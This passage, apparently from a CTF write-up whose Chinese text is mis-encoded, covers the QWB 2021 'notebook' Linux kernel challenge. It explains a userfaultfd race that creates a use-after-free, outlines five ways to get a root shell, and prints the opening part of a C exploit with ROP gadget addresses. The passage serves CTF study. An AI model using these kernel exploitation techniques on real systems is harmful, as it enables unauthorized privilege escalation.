class="number">0x60</span>ï¼Œè¿›è¯¥åˆ†æ”¯</span><br><span class="line">  copy_from_user(name, v4, <span class="number">0x100</span>LL);		<span class="comment">// notebook[idx]-&gt;sizeå°äº0x60ï¼Œè¿›è¯¥åˆ†æ”¯ã€‚å¯åˆ©ç”¨userfaultfdé˜»å¡ï¼Œå°†sizeæ”¹æˆæŸä¸ªå°äºç­‰äº0x60å¤§å°çš„å€¼</span></span><br><span class="line">  <span class="keyword">if</span> ( v5-&gt;note )                           </span><br><span class="line">  &#123;</span><br><span class="line">    v5-&gt;size = v6;</span><br></pre></td></tr></table></div></figure>
<p>è‡³æ­¤ï¼Œåˆ†æçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<ol>
<li>noteaddä¸€ä¸ªå†…æ ¸å †å—heap1</li>
<li>ã€æ–°çº¿ç¨‹1ã€‘noteeditä¼ å…¥ä¸€ä¸ªå¤§sizeï¼Œä½¿heap1è¢«freeï¼Œå¹¶é€šè¿‡userfaultfdä½¿æµç¨‹åœ¨copy_from_user()æ—¶åœä½ã€‚æ­¤æ—¶ï¼Œheap1çš„åœ°å€è¿˜åœ¨notebook[index].noteä¸Šï¼Œäºæ˜¯UAFå°±äº§ç”Ÿäº†ã€‚</li>
<li>ã€æ–°çº¿ç¨‹2ã€‘noteaddå°†heap1å¯¹åº”çš„sizeé‡æ–°æ”¹æˆåŸæ¥çš„å¤§å°ï¼Œå¹¶åœ¨copy_from_user()æ—¶åœä½ã€‚ä¸ç„¶mynote_readå’Œmynote_writeæ— æ³•æ­£å¸¸æ‰§è¡Œã€‚</li>
<li>åœ¨ä¸»çº¿ç¨‹ä¸­ï¼Œå°±å¯ä»¥è‡ªç”±åœ°å¯¹å·²ç»freeæ‰çš„heap1è¿›è¡Œè‡ªç”±è¯»å†™æ“ä½œäº†ï¼</li>
</ol>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img   src="image-20230225213203420.png?size=600" style="width: 600px;"  alt="image-20230225213203420"></p>
<p>æ¥ä¸‹æ¥å°±çœ‹æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªUAFè¯»å†™ã€‚</p>

        <h2 id="åˆ©ç”¨"   >
          <a href="#åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2>
      <p>åˆ©ç”¨æ€è·¯ï¼š</p>
<ol>
<li>æœ€æ—©noteaddæ—¶æŒ‡å®š0x20å¤§å°</li>
<li>å½“UAFäº§ç”Ÿå¹¶èƒ½è‡ªç”±è¯»å†™åï¼Œä½¿ç”¨seq_operationsç»“æ„ä½“å ç”¨heap1ã€‚ä¸ªäººè®¤ä¸ºè¿™ä¸ªç»“æ„ä½“æ¯”è¾ƒå¥½ç”¨ï¼Œæ— éœ€å¦å¤–æ„é€ å‡½æ•°æŒ‡é’ˆåˆ—è¡¨</li>
<li>å…ˆé€šè¿‡mynote_readæ³„éœ²<code>seq_operations-&gt;start</code>å‡½æ•°æŒ‡é’ˆ</li>
<li>å†é€šè¿‡mynote_writeæ”¹å†™<code>seq_operations-&gt;start</code>å‡½æ•°æŒ‡é’ˆï¼Œå®ç°æ§åˆ¶æµåŠ«æŒ</li>
<li>æ§åˆ¶æµåŠ«æŒåï¼Œåˆ©ç”¨å†…æ ¸ROPï¼ˆnotegiftæ³„éœ²å †åœ°å€ï¼‰æ ˆè¿ç§»åˆ°å †ï¼Œç»§ç»­ROPåˆ©ç”¨</li>
</ol>
<p>è¿™é‡Œåˆ—å‡ºå››ç§get root shellçš„æ–¹å¼</p>
<ul>
<li><p>modprobe_path - <strong>exp1</strong></p>
<p>1ï¼‰ä½¿ç”¨prepare()æ¨¡æ¿ï¼Œåšå¥½å‡†å¤‡å·¥ä½œï¼ˆ<code>/tmp/x</code>, <code>/tmp/dummy</code>, <code>/bin/umount</code>ï¼‰ï¼Œfork()å­è¿›ç¨‹</p>
<p>2ï¼‰å­è¿›ç¨‹å°†modprobe_pathæ”¹æˆ<code>/tmp/x</code></p>
<p>3ï¼‰çˆ¶è¿›ç¨‹ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œæ‰§è¡Œ<code>/tmp/dummy</code>ï¼Œå›shellã€‚</p>
<p>4ï¼‰å†exitå³å¯è·å¾—root shell</p>
</li>
<li><p>KPTI trampoline - <strong>exp2</strong></p>
<p>1ï¼‰æ‰§è¡Œcommit_creds(prepare_cred(0))</p>
<p>2ï¼‰åˆ©ç”¨swapgs_restore_regs_and_return_to_usermode()è®¾ç½®CR3ï¼Œå®‰å…¨è¿”å›ç”¨æˆ·æ€</p>
<p>3ï¼‰getshellè¢«æ‰§è¡Œ</p>
</li>
<li><p>signal handler - <strong>exp3</strong></p>
<p>1ï¼‰ç”¨æˆ·æ€æ³¨å†Œsignal(SIGSEGV,getshell)</p>
<p>2ï¼‰æ‰§è¡Œcommit_creds(prepare_cred(0))</p>
<p>3ï¼‰swapgså’Œiretqè¿”å›ç”¨æˆ·æ€æ—¶è§¦å‘SIGSEGV</p>
<p>4ï¼‰getshellè¢«æ‰§è¡Œ</p>
</li>
<li><p>tty_struct + work_for_cpu_fn() - <strong>exp4</strong></p>
<p>1ï¼‰å…ˆæ„é€ ä¸€ä¸ª0x3a8ï¼ˆkmalloc-1024ï¼‰å¤§å°çš„UAFå †å—heap1</p>
<p>2ï¼‰é€šè¿‡<code>open(&quot;dev/ptmx&quot;,2); </code>å–å›heap1ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶tty_structçš„å†…å®¹</p>
<p>2ï¼‰å†æ„é€ ä¸€ä¸ªä»»æ„å¤§å°ï¼ˆ0x100ï¼‰çš„å †å—heap2ï¼Œç”¨æ¥å­˜æ”¾æ„é€ çš„tty_operationsï¼Œæ›´æ”¹ioctlå‡½æ•°æŒ‡é’ˆ</p>
<p>3ï¼‰è¯»å–heap1çš„å†…å®¹ï¼Œæ›´æ”¹0x18åç§»å¤„æŒ‡å‘heap2ã€‚æ›´æ”¹0x20ï¼ˆprepare_kernel_credsï¼‰å’Œ0x28ï¼ˆå‚æ•°0ï¼‰å¤„çš„å€¼ï¼Œå¹¶ä¿å­˜0x30ï¼ˆldisc_semï¼‰å¤„çš„å€¼ä¸ºold_valueã€‚æœ€åå°†ä»¥ä¸Šå†…å®¹å†™å›heap1ã€‚</p>
<p>4ï¼‰è°ƒç”¨ioctlï¼Œå†…æ ¸å°†æ‰§è¡Œprepare_kernel_creds(0) </p>
<p>5ï¼‰è¯»å–heap1çš„å†…å®¹ï¼Œè¿”å›å€¼pkc_retåœ¨0x30å¤„ï¼Œæ›´æ”¹0x20ï¼ˆcommit_credsï¼‰å’Œ0x28ï¼ˆpkc_valueï¼‰å¤„çš„å€¼ï¼Œå¹¶æ›´æ”¹0x30ï¼ˆldisc_semï¼‰å¤„çš„å€¼ä¸ºold_valueã€‚æœ€åå°†ä»¥ä¸Šå†…å®¹å†™å›heap1ã€‚</p>
<p>6ï¼‰è°ƒç”¨ioctlï¼Œå†…æ ¸å°†æ‰§è¡Œcommit_creds(pkc_ret)</p>
<p>7ï¼‰ç”¨æˆ·æ€æ‰§è¡Œsystem(â€œ/bin/shâ€)ï¼Œå³å¯è·å¾—root shell</p>
</li>
<li><p>leak heap cookie + modprobe_path - <strong>exp5</strong></p>
<p>è¿™ä¸ªå·§å¦™çš„åˆ©ç”¨æ–¹æ³•æ¥æºï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/archives/627#notebook" >å¼ºç½‘æ¯2021 Writeup by X1cT34m</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>åˆ©ç”¨æ–¹æ³•çš„æè¿°å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/" >ä»å¼ºç½‘æ¯ Notebook çœ‹å†…æ ¸æ¡ä»¶ç«äº‰</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¯¥æ–¹æ³•ä¸éœ€è¦å†…æ ¸ROPï¼Œå·§å¦™åˆ©ç”¨äº†slubçš„æ§åˆ¶å­—èŠ‚ï¼ˆfreelist å•å‘é“¾è¡¨ï¼Œç±»ä¼¼ fastbinï¼‰ã€‚</span><br><span class="line">	1. åˆ†é…ä¸¤ä¸ª 0x60 çš„å—ï¼Œåˆ†åˆ«ä¸º chunk1, chunk2ã€‚</span><br><span class="line">	2. é€šè¿‡ gift è¯»å‡º chunk1 å’Œ chunk2 çš„åœ°å€ã€‚</span><br><span class="line">	3. free (chunk2) , free (chunk1)ï¼Œæ­¤æ—¶ freelist -&gt; chunk1 -&gt; chunk2</span><br><span class="line">	4. å†æ¬¡åˆ†é… chunk1 å’Œ chunk2ï¼Œé€šè¿‡ gift ç¡®ä¿å’Œä¸Šæ¬¡åˆ†é…çš„æ˜¯åŒä¸¤ä¸ªå—ã€‚	</span><br><span class="line">	5. æ­¤æ—¶è¯»å‡º chunk1 çš„å‰ 8 å­—èŠ‚ï¼Œè¿™ 8 å­—èŠ‚åº”ä¸º cookie ^ chunk1_addr ^ chunk2_addrï¼ˆè¯¦è§ Kirinï¼‰ã€‚è¿™æ ·å°±èƒ½æ³„éœ²å‡º cookieã€‚</span><br><span class="line">	6. é‡æ–°å¼€å§‹ï¼Œæ„é€ UAFï¼Œä½¿chunk1è¢«freeï¼Œä½†å †åœ°å€è¿˜åœ¨notebook[0]ä¸Šã€‚</span><br><span class="line">	7. å‘è¢« free æ‰çš„ chunk1 ä¸­å†™å…¥æ„é€ å¥½çš„å†…å®¹ã€‚æ­¤æ—¶æˆ‘ä»¬å†™å…¥ 8 å­—èŠ‚ cookie ^ chunk1_addr ^ notebook_addr-0x10 å³å¯å°† freelist é“¾æ”¹ä¸º freelist -&gt; chunk1 -&gt; notebook_addr - 0x10ã€‚ï¼ˆä½†æ­¤æ—¶ freelist é“¾å¹¶ä¸åˆæ³•ï¼‰</span><br><span class="line">	8. ç”±äº name åœ¨ bss ä¸Šçš„ä½ç½®æ­£å¥½åœ¨ notebook çš„å‰é¢ï¼Œæ‰€ä»¥å¯ä»¥å°† note_addr - 0x10 çš„åœ°æ–¹å†™ä¸º cookie ^ notebook_addr - 0x10 ^ 0ï¼Œè¿™æ · freelist é“¾å°±åˆæ³•äº†ã€‚</span><br><span class="line">	9. ç°åœ¨ notebook å¯æ§ï¼Œå°±èƒ½æ‹¿åˆ°ä»»æ„åœ°å€è¯»å†™çš„æƒåŠ›äº†ã€‚é€šè¿‡ notebook.ko è°ƒç”¨å†…æ ¸å‡½æ•°çš„åœ°æ–¹æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œç„¶åæ”¹å†™ modprobe_path æ¥ææƒã€‚</span><br></pre></td></tr></table></div></figure>




</li>
</ul>

        <h3 id="exp1"   >
          <a href="#exp1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3>
      <blockquote>
<p>åˆ©ç”¨modprobe_pathæ”¹umountï¼Œexité€€å‡ºç³»ç»Ÿæ—¶è·å¾—root shell</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_start_func = <span class="number">0xFFFFFFFF8128C230</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> ret_188 = <span class="number">0xffffffff811a71c6</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rax_ret = <span class="number">0xffffffff81540d04</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_ptr_rdi_rax = <span class="number">0xffffffff814157e9</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF8225D2E1</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_1a8 = <span class="number">0xffffffff816473a4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead_func = <span class="number">0xFFFFFFFF810B3FA0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  cmd</span></span><br><span class="line"><span class="comment">    0x100 - noteadd : ä¸ºnotebook[idx]-&gt;noteç”³è¯·ä¸€ç¯‡sizeå¤§å°çš„ç©ºé—´</span></span><br><span class="line"><span class="comment">    0x64 - notegift : å°†notebookå¤„çš„256ä¸ªå­—èŠ‚å…¨éƒ¨æ‹·è´ç»™ç”¨æˆ·æ€ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰ - æ³„éœ²å †åœ°å€</span></span><br><span class="line"><span class="comment">    0x200 - notedel : freeæ‰notebook[idx]-&gt;noteå¯¹åº”çš„ç©ºé—´ï¼Œåœ¨sizeä¸ä¸º0çš„æƒ…å†µä¸‹ï¼Œæ¸…ç©ºbssæ®µä¸Šçš„å†…å®¹</span></span><br><span class="line"><span class="comment">    0x300 - noteedit : ä¿®æ”¹notebook[idx]çš„å¤§å°ï¼Œnoteå’Œsizeï¼Œé€»è¾‘æœ‰é—®é¢˜å¯¼è‡´sizeå˜ä»»æ„å¤§å°</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span 